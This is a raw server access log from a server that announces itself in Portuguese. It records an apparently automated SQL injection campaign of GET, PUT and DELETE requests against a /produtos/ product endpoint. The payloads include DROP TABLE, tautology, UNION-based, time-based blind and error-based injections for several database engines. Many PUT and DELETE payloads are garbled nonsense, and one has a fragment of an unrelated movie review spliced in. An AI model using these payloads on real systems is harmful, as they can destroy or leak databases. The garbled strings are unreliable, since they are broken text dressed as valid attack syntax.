Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%201%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test';%20DROP%20TABLE%20(%20,1%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%25'%20union%20all%20select%20null,null%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20)%20)%20and%203715%20in%20(%20(%20char%20(%20113%20)%20+char%20(%20113%20)%20+char%20(%20112%20)%20+char%20(%20106%20)%20+char%20(%20113%20)%20+%20(%20select%20(%20case%20when%20(%203715%20=%203715%20)%20then%20char%20(%2049%20)%20else%20char%20(%2048%20)%20end%20)%20)%20+char%20( HTTP/1.1
172.18.0.1 - GET /produtos/test1%22))%20as%20pdcl%20where%206746=6746%20and%209594=9413 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20as%20svuz%20where%206168%20=%206168 HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%7B HTTP/1.1
172.18.0.1 - GET /produtos/test-4210'%20)%20where%206237%20=%206237%20union%20all%20select%206273,6273,6273,6273,6273,6273,6273,6273,6273%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/**/ HTTP/1.1
172.18.0.1 - GET /produtos/test1'))%20as%20qpai%20where%202619=2619;(select%20*%20from%20(select(sleep(5)))acdk) HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20)%20)%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20and%20(%20(%20(%20%22djwo%22%20=%20%22djwo HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20and%208514%20=%20(%20select%20count%20(%20*%20)%20from%20domain.domains%20as%20t1,domain.columns%20as%20t2,domain.tables%20as%20t3%20) HTTP/1.1
172.18.0.1 - GET /produtos/test1%20)%20as%20zmxb%20where%208424%20=%208424%20and%202853%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%202853%20=%202853%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20(%20c HTTP/1.1
172.18.0.1 - GET /produtos/test1'%7C%7C(select%20'urbj'%20from%20dual%20where%206951=6951%20and%202388=benchmark(5000000,md5(0x6d457153)) HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20(%20case%20when%20(%205198%20=%202518%20)%20then%205198%20else%20cast%20(%201%20as%20int%20)%20/%20(%20select%200%20from%20dual%20)%20end%20)%20from%20dual%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20as%20kebv%20where%202167%20=%202267%20and%207533%20=%207533%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test-6514%20)%20)%20as%20pbgg%20where%206841%20=%206841%20union%20all%20select%206841,6841,6841,6841%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20as%20nhfg%20where%205386%20=%205386%20or%208421%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20and%206510%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20and%20(%20(%20(%20'rfln'%20=%20'rfln HTTP/1.1
172.18.0.1 - GET /produtos/test'%20or%20''%20' HTTP/1.1
172.18.0.1 - GET /produtos/test-3492%22%20where%204094%20=%204094%20or%203440%20=%20cast%20(%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%203440%20=%203440%20)%20then%201%20else%200%20end%20)%20)%20::text%7C%7C%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7C HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20where%208776%20=%208776%20and%206969%20=%20(%20select%206969%20from%20pg_sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20where%206200%20=%206200%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1')))%20and%203715%20in%20((char(113)+char(113)+char(112)+char(106)+char(113)+(select%20(case%20when%20(3715=3715)%20then%20char(49)%20else%20char(48)%20end))+char(113)+char(122)+char(118)+char(122)+char(113)))%20and%20(((%22ncgh%22=%22ncgh HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20or%204411%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20and%20(%20(%20(%20'nglz'%20=%20'gllz HTTP/1.1
172.18.0.1 - GET /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22;%7B%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20)%20and%207533%20=%207533%20and%20(%20(%20(%20'hoyw'%20=%20'hoyw HTTP/1.1
172.18.0.1 - GET /produtos/test1'+%20(%20select%20'rpds'%20where%205870%20=%205870%20and%204595%20=%204595 HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20)%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20and%20(%20(%20'ytxg'%20=%20'ytxg HTTP/1.1
172.18.0.1 - GET /produtos/test-7111%22%20union%20all%20select%202805,2805,2805,2805,2805,2805,2805,2805%20-- HTTP/1.1
172.18.0.1 - GET /produtos/test1'%20)%20where%207629%20=%207629%20rlike%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20vwyq%20)%20 HTTP/1.1
172.18.0.1 - GET /produtos/test1%22%20)%20where%202312%20=%202312%20and%20(%20select%209067%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209067%20=%209067,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.character_set HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LiKE%20'3'%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20LIcE%20tUAL_NOT%20RULL%20(%20@ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20-%20Table_name%20(%20Chr%20(%20'1A HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscolame%20)%20FroM%20(%20SELECT%20DISTINCT%20(%20USERNAme%20)%20,%20rownum%20aS%20LiMIt%20FROM%20SYs.all_UseRs%20)%20WHErE%20L HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@@@%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$,%20ly%20)%20'/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20=%201%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20tabctame%20and%20'i'%20=%20'1 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20ullecale%20nomenatelbent%20'aticno'%20)%20',',' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20and%20'updat'%20like%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20trbetanchers%20'actembelinm'%20' HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20converse%20)%20not%20tebe%20nemati HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,adechure%20)%20,%201,%20@)%20--%201 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charent$tyle_)%20%3C&%20'gwap'%20)%20,%3C@,1%20)%20,1,1,1,1%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20)%20velcement%201%20tibntable%20(%201/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20userschart';%20like%20's',@'her';; HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,male_came_tem/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charent$$$lole_)%20'%20AND%20true%20OR%20False HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20lybe_taber'%20)%20and%20(%201%20=%201 HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,ly,%20)%20'/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20verseoncmant%20ide%20Lice%20table%20NAte%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20table_name'%20)%20,RASSuSE HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat'%20)%20)%20,1,1,1%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,%20)%20,%20p1,spuserase%20)%20;cast%20(%20(%20case%20incolean%20(%20select%20(select%201%201%20/**/ HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20Se HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20S%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - PUT /produtos/test';%20DROP%20TABLE%20S HTTP/1.1
172.18.0.1 - PUT /produtos/test%22%20OR%20%221%22=%221%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test%22%20OR%20%221%22=%221%22%20AND%20(SELECT%20(SELECT%201))%20AND%20True HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20where%204297%20=%204297%20or%202367%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20and%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20fzno%20)%20and%20(%20(%20'tpqy'%20like%20'tpyy HTTP/1.1
172.18.0.1 - PUT /produtos/test1'+%20(%20select%20'yyyn'%20where%205395%20=%205395 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20)%20where%202060%20=%202060 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20yltu%20where%201350%20=%201350%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20as%20hlit%20where%204973%20=%204973%20procedure%20analyse%20(%20extractvalue%20(%209627,concat%20(%200x5c,%20(%20benchmark%20(%205000000,md5%20(%200x4b774c75%20)%20)%20)%20)%20)%20,1%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20ljpy%20where%208270%20=%208270%20or%20(%20select%209173%20from%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%209173%20=%209173,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20information_schema.charac HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20)%20or%20(%20select%20*%20from%20(%20select%20(%20sleep%20(%205%20)%20)%20)%20ydpu%20)%20and%20(%20(%207805%20=%207805 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20and%20'ioar'%20=%20'ioar--I%20tried%20to%20make%20this%20one%20of%20the%20worst%20films%20I%20have%20ever%20had%20the%20missing%20watching%20the%20solist%20World%20Way.%20It's%20so%20much%20about%20this%20movie,%20it%20was%20a%20fascinating%20power%20strup%20to%20cha HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22;%25%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20or%205286%20=%20(%20select%20count%20(%20*%20)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%7C%7C%20(%20select%20'xzoq'%20where%209263%20=%209263 HTTP/1.1
172.18.0.1 - PUT /produtos/test-8021'%20)%20)%20or%205023%20=%20ctxsys.drithsx.sn%20(%205023,%20(%20chr%20(%20113%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20112%20)%20%7C%7Cchr%20(%20106%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7C%20(%20select%20(%20case%20when%20(%205023%20=%205023%20)%20then%201%20else%200%20end%20)%20from%20dual%20)%20%7C%7Cchr%20(%20113%20)%20%7C%7Cchr%20(%20122%20)%20%7C%7Cchr%20(%20118%20)%20%7C%7Cchr%20(%20122%20)%20%7C HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20and%208407%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20)%20and%20'wytg'%20=%20'wytg HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20esjj%20where%207781%20=%207780%20or%20updatexml%20(%201808,concat%20(%200x2e,0x7171706a71,%20(%20select%20(%20elt%20(%201808%20=%201808,1%20)%20)%20)%20,0x717a767a71%20)%20,8666%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test-1808%25%22%20)%20)%20or%204595%20=%203545%20and%20(%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20ohcs%20where%209588%20=%209588%20or%20elt%20(%206272%20=%206272,sleep%20(%205%20)%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20najc%20where%205213%20=%205213%20procedure%20analyse%20(%20extractvalue%20(%209255,concat%20(%200x5c,%20(%20benchmark%20(%205000000,md5%20(%200x52515a50%20)%20)%20)%20)%20)%20,1%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20) HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20where%209216%20=%209216 HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20)%20as%20myxo%20where%201759%20=%201759%20union%20all%20select%20null HTTP/1.1
172.18.0.1 - PUT /produtos/test1%22%20where%202235%20=%202235%20union%20all%20select%20null,null,null,null,null%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%25'%20)%20union%20all%20select%20null,null,null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20)%20or%20row%20(%201045,7562%20)%20%3E%20(%20select%20count%20(%20*%20)%20,concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%201045%20=%201045,1%20)%20)%20)%20,0x717a767a71,floor%20(%20rand%20(%200%20)%20*2%20)%20)%20x%20from%20(%20select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%20)%20a%20group%20b HTTP/1.1
172.18.0.1 - PUT /produtos/test-6292%20)%20union%20all%20select%207499,7499,7499,7499,7499,7499,7499%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/testselect%20(%20case%20when%20(%209986%20=%208342%20)%20then%209986%20else%209986*%20(%20select%209986%20from%20information_schema.character_sets%20)%20end%20)%20 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%7C%7C%20(%20select%20'bzxa'%20where%206320%20=%206320 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20where%205680%20=%205680%20and%20(%203020%20=%203020%20)%20*6703%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20)%20and%206240%20=%20(%20'qqpjq'%7C%7C%20(%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb$database%20)%20%7C%7C'qzvzq'%20)%20and%20(%20(%20(%20'bwka'%20=%20'bwka HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20)%20union%20all%20select%20null,null,null,null,null,null,null,null HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20)%20as%20yzto%20where%204592%20=%204592%20and%20make_set%20(%208403%20=%208403,8899%20)%20-- HTTP/1.1
172.18.0.1 - PUT /produtos/test1%20)%20where%209160%20=%209160 HTTP/1.1
172.18.0.1 - PUT /produtos/test1'%20and%206414%20=%20(%20select%20count%20(%20*%20)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4%20)%20and%20'dphz'%20=%20'dphz HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,usern;tall_alc HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20trectallyuseri HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20)%20,%20userneman HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'DboC'%20)%20,(SELECT%20(SELECT%201))%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20table_schema,table_name%20FROM%20iname_1; HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alecture'%20)%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseonchar%20(%20LIKE%20'Y'%20OR%20'y'%20LIKe%20'yw' HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1001%20)%20and%20(%20(%202002%20=%202002%20/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20)%20(%3C@@@$,@,VersERTaN%20From%20VEREATErALi HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20table_sccamedo_tabe%20from%20vybe HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alecture%20)%20)%20,%20and%20'i'%20=%20'i HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20(%20,%20users,gverpabp_race_table_ancibr_tgesnable%20Nate%20(%20'ngated%20)%20%3Cnt%20thine%20( HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo'%20%3C)%20,2b8%20)%20,(SELECT%200o1)%20) HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20-%20Table_name,%20DiRLaT%20'pession',%20'Sawswere'%20unDerp%20') HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.%20ly$),alb%20tabe/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@@%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybes%20lyat%201%20Fige%20Dy%20Gaoppianate%20PActage%20Albalanca HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@version,%20)%20/**/ HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20verseoncmane%20(%20'Dbo2'%20)%20,BENCeMArE%20(%200X1C4b40,mD5%20(%200X52515a0X0x5%20)%20)%20)%20)%20)%20,(SELECT%20(SELECT%20(SELECT%20(SELECT%20(SELECT HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,alecture'%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@@verscolame%20)%20FroM%20(%20SELECT%20@@version%20)%20,%20(SelEct%20(SELECT%201))%20)%20,@@VERSION%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20(,%20table_sacceraters,aneverpabed%20vyreparsed HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20benchmart%20)%20,1000,1061%20)%20and%20(%201928%20=%201928 HTTP/1.1
172.18.0.1 - DELETE /produtos/test'%20UNION%20SELECT%20@%20,%20users,made%20(char;ly$typeabale%20)%20;;' HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%20SEm HTTP/1.1
172.18.0.1 - DELETE /produtos/test';%20DROP%20TABLE%201%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test%22%20OR%20%221%22=%221%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'+%20(%20select%20myci%20where%208903%20=%208903 HTTP/1.1
172.18.0.1 - DELETE /produtos/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%20(%20;%22%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20as%20uqem%20where%203521%20=%203521 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20where%208333%20=%208333 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20)%20)%20and%20elt%20(%201210%20=%201210,sleep%20(%205%20)%20)%20and%20(%20(%20(%20%22ilge%22%20like%20%22ilge HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20and%20(%20select%202*%20(%20if%20(%20(%20select%20*%20from%20(%20select%20concat%20(%200x7171706a71,%20(%20select%20(%20elt%20(%203484%20=%203484,1%20)%20)%20)%20,0x717a767a71,0x78%20)%20)%20s%20)%20,%208446744073709551610,%208446744073709551610%20)%20)%20)%20and%20'lxqz'%20=%20'lxqz HTTP/1.1
172.18.0.1 - DELETE /produtos/test-8650'%20where%206813%20=%206813%20or%206872%20=%206872%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20or%204411%20=%20(%20select%20count%20(%20*%20)%20from%20sysusers%20as%20sys1,sysusers%20as%20sys2,sysusers%20as%20sys3,sysusers%20as%20sys4,sysusers%20as%20sys5,sysusers%20as%20sys6,sysusers%20as%20sys7%20)%20 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1'%20)%20)%20as%20hqhs%20where%205383%20=%205383 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20and%208407%20=%20(%20select%20count%20(%20*%20)%20from%20generate_series%20(%201,5000000%20)%20) HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%25%22%20)%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20and%20(%20%22%25%22%20=%20%22 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20as%20xlww%20where%205844%20=%205844 HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%22%20)%20)%20as%20foul%20where%204326%20=%204236%20and%20elt%20(%204249%20=%204249,7259%20)%20-- HTTP/1.1
172.18.0.1 - DELETE /produtos/test1%20)%20)%20as%20skrx%20where%207659%20=%207659 HTTP/1.1
172.18.0.1 - DELETE /produtos/test-9355'%20or%206872%20=%206872%20and%20'mztk'%20=%20'mztk HTTP/1.1
